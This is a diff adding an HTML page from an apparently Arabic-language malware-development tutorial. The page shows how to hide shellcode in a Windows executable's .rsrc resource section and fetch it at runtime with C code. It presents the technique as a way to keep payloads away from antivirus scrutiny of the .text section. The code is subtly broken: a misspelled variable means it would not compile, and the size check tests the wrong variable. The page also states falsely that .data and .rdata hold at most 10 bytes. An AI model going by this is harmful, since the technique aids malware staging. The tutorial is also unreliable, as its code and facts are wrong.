+                            style="background: #16ff00; font-size: 14px;">()LoadResource</code>.</li>
+                    <li>آخر جزء وهو محتاجين نوصل للمحتوي اللـ جوا الأيقونه ، اللـ هو الشيل كود بتاعنا .. وهنستخدم
+                        <code style="background: #16ff00; font-size: 14px;">()LockResource</code>.
+                    </li>
+                </ol>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p style="font-weight: bold;">[+] يلا بينا هنبدأ شرح الكود:</p>
+                <ul>
+                    <li>أول جزء فـ الكود .. عرفت متغير اسمه <code
+                            style="background: #16ff00; font-size: 14px;">hRsrc</code> من نوع <code
+                            style="background: #16ff00; font-size: 14px;">HRSRC</code> وحطيت فيه <code
+                            style="background: #16ff00; font-size: 14px;">NULL</code> كـ بداية ..
+                        وبيتخزن فيه
+                        الراجع من العملية <code style="background: #16ff00; font-size: 14px;">()FindResourceW</code>.
+                    </li>
+                </ul>
+                <div class="code-block"><code>
+                    HRSRC hRsrc = NULL;
+                    <br><br>
+                    hRsrc = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RSRCDATA1), RT_RCDATA);<br>
+                    if (hRsrc == NULL) {<br>
+                        &nbsp;&nbsp;printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;return -1;<br><br>
+                    }<br>
+            </code></div>
+                <ul>
+                    <li>استخدمت <code style="background: #16ff00; font-size: 14px;">()FindResourceW</code> ، ودي اللـ
+                        اتكلمنا عنها فوق .. وعشان تفهم استخدامها صح تقدر تشوف الـ
+                        Documentation بتاعها من <a
+                            href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-findresourcew"
+                            target="_blank" class="download-link">[هنا]</a>.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc8.png" alt="Rsrc-Placement8" class="article-image" loading="lazy">
+                    </div>
+                    <li>عشان تجيب الـ ID بتاع الأيقونه .. هتطلع ع <code
+                            style="background: #16ff00; font-size: 14px;">Resource.h</code> وتضغط <code
+                            style="background: #16ff00; font-size: 14px;">Ctrl + Left-Click</code> .. وهيظهرلك تعريف
+                        الأيقونه.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc9.png" alt="Rsrc-Placement9" class="article-image" loading="lazy">
+                    </div>
+                    <li>أخر جزئية فـ الكود وهي <code style="background: #16ff00; font-size: 14px;">IF Statement</code>
+                        .. لو العملية فشلت بترجع <code style="background: #16ff00; font-size: 14px;">NULL</code> وعرفنا
+                        معلومة زي دي بناءا ع
+                        الـ Documentation.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc10.png" alt="Rsrc-Placement10" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <ul>
+                    <li>تاني جزء فـ الكود وهو إني بجيب حجم الأيقونه .. وهنا عرفت متغير اسمه <code
+                            style="background: #16ff00; font-size: 14px;">sPayloadSzize</code> من نوع <code
+                            style="background: #16ff00; font-size: 14px;">SIZE_T</code>
+                        وحطيت فيه <code style="background: #16ff00; font-size: 14px;">NULL</code> ، ودا بيتخزن فيه
+                        الراجع من العملية <code style="background: #16ff00; font-size: 14px;">()SizeofResource</code>.
+                    </li>
+                </ul>
+                <div class="code-block"><code>
+                    SIZE_T sPayloadSzize = NULL;
+                    <br><br>
+                    sPayloadSzize = SizeofResource(NULL, hRsrc);<br>
+                    if (hRsrc == 0) {<br>
+                        &nbsp;&nbsp;printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;return -1;<br><br>
+                    }<br>
+            </code></div>
+                <ul>
+                    <li>وزي اللـ فاتت ، تقدر تشوف الـ Documentation من <a
+                            href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource"
+                            target="_blank" class="download-link">[هنا]</a> عشان تعرف الـ parameters والـ Return Value.
+                    </li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc11.png" alt="Rsrc-Placement11" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p>وبكدا المفروض تكون فهمت الفكرة ومش محتاج أشرح الجزئين الباقيين لإنهم زي بعض.</p>
+                <ul>
+                    <li>دا الجزء التالت من الكود .. ومن <a
+                            href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource"
+                            target="_blank" class="download-link">[هنا]</a> تقدر ترجع للـ Documentation.</li>
+                </ul>
+                <div class="code-block"><code>
+                    HGLOBAL hGlobal = NULL;
+                    <br><br>
+                    hGlobal = LoadResource(NULL, hRsrc);<br>
+                    if (hGlobal == NULL) {<br>
+                        &nbsp;&nbsp;printf("[!] LoadResource Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;return -1;<br><br>
+                    }<br>
+            </code></div>
+                <ul>
+                    <li>الجزء الرابع والـ Documentation من <a
+                            href="https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-lockresource"
+                            target="_blank" class="download-link">[هنا]</a>.</li>
+                </ul>
+                <div class="code-block"><code>
+                    PVOID pPayloadAddress = NULL;
+                    <br><br>
+                    pPayloadAddress = LockResource(hGlobal);<br>
+                    if (pPayloadAddress == NULL) {<br>
+                        &nbsp;&nbsp;printf("[!] LockResource Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;return -1;<br><br>
+                    }<br>
+            </code></div>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p style="font-weight: bold;">[+] بكدا يكون الكود خلص .. الكود النهائي:</p>
+                <p><code
+                        style="font-size: 14px;">ضيفت مجرد عملتين طباعة بحيث نشوف عنوان الأيقونه .. وحجم الشيل كود بتاعنا.</code>
+                </p>
+                <div class="code-block"><code>
+                    #include &lt;Windows.h&gt;<br>
+                    #include &lt;stdio.h&gt;<br>
+                    #include "resource.h"
+                    <br><br>
+                    int main() {<br>
+                        &nbsp;&nbsp;HRSRC hRsrc = NULL;<br>
+                        &nbsp;&nbsp;SIZE_T sPayloadSzize = NULL;<br>
+                        &nbsp;&nbsp;HGLOBAL hGlobal = NULL;<br>
+                        &nbsp;&nbsp;PVOID pPayloadAddress = NULL;
+                    <br><br>
+                    &nbsp;&nbsp;hRsrc = FindResourceW(NULL, MAKEINTRESOURCE(IDR_RSRCDATA1), RT_RCDATA);<br>
+                    &nbsp;&nbsp;if (hRsrc == NULL) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br><br>
+                        &nbsp;&nbsp;}
+                    <br><br>
+                    &nbsp;&nbsp;sPayloadSzize = SizeofResource(NULL, hRsrc);<br>
+                    &nbsp;&nbsp;if (hRsrc == 0) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br><br>
+                        &nbsp;&nbsp;}
+                    <br><br>
+                    &nbsp;&nbsp;hGlobal = LoadResource(NULL, hRsrc);<br>
+                    &nbsp;&nbsp;if (hGlobal == NULL) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] LoadResource Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br><br>
+                        &nbsp;&nbsp;}
+                    <br><br>
+                    &nbsp;&nbsp;pPayloadAddress = LockResource(hGlobal);<br>
+                    &nbsp;&nbsp;if (pPayloadAddress == NULL) {<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;printf("[!] LockResource Failed With Error : %d \n", GetLastError());<br>
+                        &nbsp;&nbsp;&nbsp;&nbsp;return -1;<br><br>
+                        &nbsp;&nbsp;}<br>
+                        <br><br>
+                        &nbsp;&nbsp;printf("[i] pPayloadAddress var : 0x%p \n", pPayloadAddress);<br>
+                        &nbsp;&nbsp;printf("[i] sPayloadSize var : %ld \n", sPayloadSize);<br>
+                        &nbsp;&nbsp;getchar();<br><br>
+                        &nbsp;&nbsp;return 0; <br>
+                    }<br>
+            </code></div>
+                <ul>
+                    <li>يلا نـ <code style="background: #16ff00; font-size: 14px;">Build</code> ، ونشوف ع <a
+                            href="https://github.com/zodiacon/TotalPE2/releases" target="_blank"
+                            class="download-link">Total PE</a> .. هنلاقي إن الشيل كود بتاعنا فعلا موجود.</li>
+                    <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="100">
+                        <img src="../src/Pics/Rsrc-Plc12.png" alt="Rsrc-Placement12" class="article-image"
+                            loading="lazy">
+                    </div>
+                </ul>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>هنتكلم دلوقتي عن الصلاحيات للأماكن اللـ ذكرناهم فوق:</p>
+                <table>
+                    <tr>
+                        <th>الصلاحيات</th>
+                        <th>السيكشن</th>
+
+                    </tr>
+                    <tr>
+                        <td>Read - Write</td>
+                        <td>data</td>
+
+
+                    </tr>
+                    <tr>
+                        <td>Read</td>
+                        <td>rdata</td>
+
+                    </tr>
+                    <tr>
+                        <td>Read - Execute</td>
+                        <td>text</td>
+
+                    </tr>
+                    <tr>
+                        <td>Read</td>
+                        <td>rsrc</td>
+
+                    </tr>
+                </table>
+                <p style="font-weight: bold;">[+] طب هل الصلاحيات دي مهمة ؟ بمعني إني لو حطيت الشيل كود فـ منطقة زي الـ
+                    rsrc اللـ هي بصلاحيات قراءة
+                    فقط .. ، معني كده إنه مش
+                    هيشتغل؟</p>
+                <ul>
+                    <li>فـ الحقيقة .. دي مش مشكلة أصلا .. يعني لو هتحط الشيل فـ أي مكان فيهم مش هتفرق .. لإن لو فاكر فـ
+                        أول
+                        مقالة لما استخدمنا الـ <code style="background: #16ff00; font-size: 14px;">()HeapAlloc</code>
+                        عشان
+                        نحجز مكان فـ الميموري .. واستخدمنا كمان <code
+                            style="background: #16ff00; font-size: 14px;">()memcpy</code> عشان ننقل
+                        الكود بتاعنا للمنطقة المحجوزة فـ الميموري.</li>
+                    <li>نقدر بنفس الطريقة ناخد الشيل كود اللـ موجود فـ مكان زي الـ rsrc واللـ بصلاحيات قراءة .. ونحجزلة
+                        مكان
+                        فـ الميموري وننقله هناك .. وكمان نقدر وقتها نديله صلاحيات زي الـ Execute .. وهنعرف إزاي نعمل ده
+                        فـ
+                        المقالات الجاية.</li>
+                </ul>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p style="font-weight: bold;">[+] طب ليه الهاكرز بيحبوا منطقة الـ rsrc ؟</p>
+                <p>قولتلك فوق إن هتعرف فـ آخر المقالة ، وجه الوقت أقولك .. بيفضلوا المكان ده لإن :</p>
+                <ul>
+                    <li>مناطق الـ data والـ rdata ، محدودين من نحية الحجم .. حجمهم 10 بايت ودا الحد الأقصي ليهم .. يعني
+                        لو الشيل كود بتاعك حجمه كبير فـ صعب يتحط فـ المنطقتين دول.</li>
+                    <li>وبالنسبة لمنطقة الـ text ، ودي بتكون متراقبة بشكل كبير من برامج الـ Antivirus ، لإن فيها صلاحيات
+                        Execute ، فـ مش أنسب حاجه تحط الشيل كود بتاعك فيها.</li>
+                </ul>
+                <p style="border-top: 2px solid #16ff00;"></p>
+                <p>وبكدا . أتمني تكون استفدت حاجه .. ونلتقي فـ مقالة قادمة .. ولو عندك أي تعليق ، استفسار ، أي حاجه ..
+                    متترددش وكلمني.</p>
+            </div>
+            <div class="article" data-aos="fade-up" data-aos-duration="800" data-aos-delay="300">
+                <h2>References</h2>
+                <p>خدلك لفة فـ المصادر والمراجع يا عزيزي:</p>
+                <ul>
+                    <li><a href="https://4p0cryph0n.github.io/malware%20dev/windows-malware-development-3/"
+                            target="_blank" class="download-link">Payload Placement Basics - .data</a></li>
+                    <li><a href="https://4p0cryph0n.github.io/malware%20dev/windows-malware-development-2/"
+                            target="_blank" class="download-link">Payload Placement Basics - .text</a></li>
+                    <li><a href="https://4p0cryph0n.github.io/malware%20dev/windows-malware-development-4/"
+                            target="_blank" class="download-link" s>Payload Placement Basics - .rsrc</a>
+                    </li>
+
+
+
+
+
+
+
+
+
+            </div>
+            <div class="nav-buttons">
+                <a href="#" onclick="nextArticle()" style="direction: ltr;">Next →</a>
+                <a href="./PE-Files.html" onclick="previousArticle()" style="direction: ltr;">← Previous</a>
+            </div>
+    </section>
+    <footer class="footer" data-aos="zoom-in" data-aos-duration="800" style="direction: ltr;">
+        <p>&copy; <span id="year"></span> <a href="https://0x4de1.github.io">0x4de1</a>. All rights reserved.</p>
+    </footer>
+
+    <script src="../src/JS/script.js"></script>
+    <script src="https://unpkg.com/aos@next/dist/aos.js" defer></script>
+    <script>
+        window.onload = function () {
+            AOS.init({ offset: 0 });
+        };
+    </script>
+    <script>document.getElementById("year").textContent = new Date().getFullYear();</script>
+</body>
+
+</html>
